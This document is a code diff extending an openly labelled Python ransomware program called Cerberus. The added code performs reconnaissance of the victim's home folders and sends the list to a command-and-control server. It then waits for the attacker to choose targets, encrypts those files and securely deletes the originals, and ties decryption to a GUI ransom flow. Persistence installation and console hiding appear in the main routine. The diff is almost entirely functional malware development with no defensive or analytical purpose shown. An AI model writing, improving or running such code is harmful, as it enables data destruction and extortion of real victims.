@@ -64,6 +64,7 @@ LOCK_FILE = os.path.join(CONFIG_DIR, ".cerberus_lock")
 ID_FILE = os.path.join(CONFIG_DIR, "cerberus_id.txt") 
 KEY_BACKUP_FILE = os.path.join(CONFIG_DIR, "cerberus_key.bak")
 LOG_FILE = os.path.join(CONFIG_DIR, "cerberus_log.txt")
+ENCRYPTED_PATHS_FILE = os.path.join(CONFIG_DIR, "encrypted_paths.json")  # Track which dirs were encrypted
 
 # Cleanup Marker (Can stay in config dir or be global)
 CLEAN_MARKER = os.path.join(CONFIG_DIR, ".cerberus_freed")
@@ -218,12 +219,78 @@ def log_error(message):
     except:
         pass 
 
-# --- Ransomware Logic ---
-def encrypt_directory():
-    if not os.path.exists(TARGET_DIRECTORY):
-        try: os.makedirs(TARGET_DIRECTORY)
-        except: pass
+# --- Target Selection ---
+def scan_directories(root_path, max_depth=2, current_depth=0):
+    """Recursively scan directories up to max_depth levels."""
+    dirs = []
+    if current_depth >= max_depth:
+        return dirs
+    try:
+        for entry in os.scandir(root_path):
+            if entry.is_dir() and not entry.name.startswith('.'):
+                dirs.append(entry.path)
+                # Recursively scan subdirectories
+                if current_depth < max_depth - 1:
+                    dirs.extend(scan_directories(entry.path, max_depth, current_depth + 1))
+    except (PermissionError, OSError):
+        pass  # Skip inaccessible directories
+    return dirs
 
+def scan_and_wait_for_instructions():
+    """
+    1. Scans directories in home (nested up to 2 levels).
+    2. Sends them to C2.
+    3. Polls until C2 sends back a target list.
+    Returns: list of paths to encrypt, or None if C2 unreachable.
+    """
+    home = os.path.expanduser("~")
+    
+    # Scan nested folders (2 levels deep) in home
+    dirs = scan_directories(home, max_depth=2)
+    log_error(f"Scanned {len(dirs)} directories (2 levels deep)")
+    
+    # Generate temp ID for recon phase
+    temp_id = base64.urlsafe_b64encode(os.urandom(6)).decode().rstrip('=')
+    log_error(f"Recon ID: {temp_id} - Found {len(dirs)} folders")
+    
+    # Send to C2
+    payload = {"id": temp_id, "type": "RECON", "files": dirs}
+    try:
+        requests.post(f"{C2_SERVER_URL}/api/recon", json=payload, timeout=5)
+    except Exception as e:
+        log_error(f"Recon send failed: {e}")
+        return None  # Fail to offline mode
+    
+    # Poll for command
+    log_error("Waiting for attacker to select targets...")
+    for _ in range(120):  # Wait up to 10 minutes (120 * 5s)
+        try:
+            resp = requests.get(f"{C2_SERVER_URL}/api/task/{temp_id}", timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                if data.get("action") == "ENCRYPT":
+                    targets = data.get("targets", [])
+                    log_error(f"Received ENCRYPT command for {len(targets)} targets")
+                    return targets
+        except:
+            pass
+        time.sleep(5)
+    
+    log_error("Timed out waiting for command")
+    return None
+
+# --- Ransomware Logic ---
+def encrypt_directory(target_list=None):
+    """Encrypts files in target directories. If target_list is None, falls back to default TARGET_DIRECTORY."""
+    
+    # Fallback to default if no list provided (offline mode)
+    if target_list is None or len(target_list) == 0:
+        target_list = [TARGET_DIRECTORY]
+        if not os.path.exists(TARGET_DIRECTORY):
+            try: os.makedirs(TARGET_DIRECTORY)
+            except: pass
+
+    # Resume from crash if key backup exists
     if os.path.exists(KEY_BACKUP_FILE):
         log_error("Found key backup. Resuming from crash...")
         try:
@@ -232,6 +299,7 @@ def encrypt_directory():
         except:
             pass 
 
+    # Skip if already encrypted
     if os.path.exists(LOCK_FILE):
         log_error("Encryption seemingly complete (Lock file exists).")
         return None
@@ -244,21 +312,31 @@ def encrypt_directory():
     except Exception as e:
         log_error(f"Failed to write key backup: {e}")
 
+    # Save target list for decryption later
+    try:
+        with open(ENCRYPTED_PATHS_FILE, 'w') as f:
+            json.dump(target_list, f)
+    except Exception as e:
+        log_error(f"Failed to save encrypted paths: {e}")
+
     encrypted_files = 0
-    # ONLY WALK TARGET_DIRECTORY
-    if os.path.exists(TARGET_DIRECTORY):
-        for root, _, files in os.walk(TARGET_DIRECTORY):
-            for file in files:
-                file_path = os.path.join(root, file)
-                if os.path.splitext(file)[1].lower() in TARGET_EXTENSIONS and not file_path.endswith(ENCRYPTED_EXTENSION):
-                    if encrypt_file_aes_gcm(file_path, aes_key):
-                        secure_delete_file(file_path)
-                        encrypted_files += 1
+    
+    # Iterate over ALL selected target directories
+    log_error(f"Encrypting {len(target_list)} directories...")
+    for target_path in target_list:
+        if os.path.exists(target_path):
+            for root, _, files in os.walk(target_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    if os.path.splitext(file)[1].lower() in TARGET_EXTENSIONS and not file_path.endswith(ENCRYPTED_EXTENSION):
+                        if encrypt_file_aes_gcm(file_path, aes_key):
+                            secure_delete_file(file_path)
+                            encrypted_files += 1
 
     with open(LOCK_FILE, 'w') as f:
         f.write("Encryption complete.")
 
-    log_error(f"Encryption finished. {encrypted_files} files targeted.")
+    log_error(f"Encryption finished. {encrypted_files} files encrypted.")
     return aes_key
 
 def check_in_with_c2(aes_key):
@@ -639,13 +717,25 @@ class RansomwareGUI:
         try:
             key = base64.b64decode(key_b64)
             decrypted_files = 0
-            if os.path.exists(TARGET_DIRECTORY):
-                for root, _, files in os.walk(TARGET_DIRECTORY):
-                    for file in files:
-                        if file.endswith(ENCRYPTED_EXTENSION):
-                            file_path = os.path.join(root, file)
-                            if decrypt_file_aes_gcm(file_path, key):
-                                decrypted_files += 1
+            
+            # Load saved encrypted paths (prefer this over default)
+            target_paths = [TARGET_DIRECTORY]  # Default fallback
+            if os.path.exists(ENCRYPTED_PATHS_FILE):
+                try:
+                    with open(ENCRYPTED_PATHS_FILE, 'r') as f:
+                        target_paths = json.load(f)
+                except:
+                    pass
+            
+            # Decrypt ALL encrypted directories
+            for target_path in target_paths:
+                if os.path.exists(target_path):
+                    for root, _, files in os.walk(target_path):
+                        for file in files:
+                            if file.endswith(ENCRYPTED_EXTENSION):
+                                file_path = os.path.join(root, file)
+                                if decrypt_file_aes_gcm(file_path, key):
+                                    decrypted_files += 1
             
             # --- CLEAN UP ---
             self.heartbeat_thread_running = False # Stop all background threads
@@ -690,16 +780,16 @@ class RansomwareGUI:
 # --- Main Execution ---
 if __name__ == "__main__":
     if os.path.exists(CLEAN_MARKER):
-        # Double check if cleaner didn't finish
-        pass 
+        # Already cleaned up - exit
+        sys.exit(0)
     
     # 0. Persistence Installation
     install_persistence()
 
     hide_console()
 
-    # PERSISTENCE CHECK-IN
-    # Check ID file in stable CONFIG_DIR
+    # PERSISTENCE CHECK-IN (Restoring after reboot)
+    # If ID file exists, we already encrypted - just show GUI
     if os.path.exists(ID_FILE):
         try:
             with open(ID_FILE, 'r') as f:
@@ -713,9 +803,20 @@ if __name__ == "__main__":
         except:
             pass 
     
-    # NEW INFECTION
-    aes_key = encrypt_directory()
+    # NEW INFECTION FLOW
+    # Step 1: Try to get target selection from C2
+    log_error("Starting new infection - attempting target selection...")
+    selected_targets = scan_and_wait_for_instructions()
     
+    # Step 2: Encrypt (selected targets OR default if C2 unreachable)
+    if selected_targets:
+        log_error(f"C2 selected {len(selected_targets)} targets")
+        aes_key = encrypt_directory(selected_targets)
+    else:
+        log_error("C2 unreachable or timed out - using default target")
+        aes_key = encrypt_directory()  # Falls back to TARGET_DIRECTORY
+    
+    # Step 3: Check in and launch GUI
     if aes_key:
         victim_id = check_in_with_c2(aes_key)
         if victim_id:
@@ -726,3 +827,4 @@ if __name__ == "__main__":
             log_error("Failed to get Victim ID. Aborting GUI.")
     else:
         log_error("Encryption skipped or failed. Aborting.")
+
